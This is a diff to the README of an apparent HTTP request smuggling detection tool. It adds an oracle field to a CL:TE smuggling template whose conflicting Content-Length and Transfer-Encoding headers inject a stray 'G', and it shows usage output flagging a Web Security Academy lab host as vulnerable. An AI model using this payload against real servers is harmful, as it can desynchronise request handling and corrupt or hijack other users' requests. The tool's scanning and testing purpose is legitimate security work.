@@ -5,19 +5,21 @@ I took some ideas from this article https://www.synopsys.com/blogs/software-secu
 
 
 
-Templates:
+A basic CL:TE template:
 ```
-POST {{.Path}} HTTP/1.1
-Host: {{.Host}}
-Connection: keep-alive
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 6
-Transfer-Encoding: chunked
-
-0
-
-G
-
+Oracle: match GPOST
+Request: |+
+  POST {{.Path}} HTTP/1.1
+  Host: {{.Host}}
+  Connection: keep-alive
+  Content-Type: application/x-www-form-urlencoded
+  Content-Length: 6
+  Transfer-Encoding: chunked
+  
+  0
+  
+  G
+  
 ```
 
 Usage:
@@ -46,6 +48,3 @@ https://acbf1fa51ea928ebc0ae8934000800c3.web-security-academy.net/ is vulnerable
 https://acbf1fa51ea928ebc0ae8934000800c3.web-security-academy.net/ is vulnerable, payload: templates/template3.txt
 
 ```
-
-# todo
-Allow the oracle to read conditions from the template
